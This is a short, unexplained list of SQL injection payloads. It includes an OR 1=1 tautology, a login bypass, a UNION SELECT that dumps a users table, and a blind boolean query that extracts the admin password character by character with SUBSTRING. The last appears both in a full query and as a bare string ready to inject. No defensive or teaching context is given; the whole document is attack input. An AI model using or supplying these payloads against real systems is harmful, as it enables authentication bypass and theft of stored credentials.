SELECT * FROM users WHERE name = 'input' OR 1=1;--;

SELECT * FROM users WHERE username = '' OR '1'='1' AND password = 'input_password';

SELECT * FROM products WHERE category = '' UNION SELECT * FROM users--;

SELECT * FROM users WHERE username = 'input' AND password = 'input_password' OR SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'a'--;
' OR SUBSTRING((SELECT password FROM users WHERE username = 'admin'), 1, 1) = 'a'--
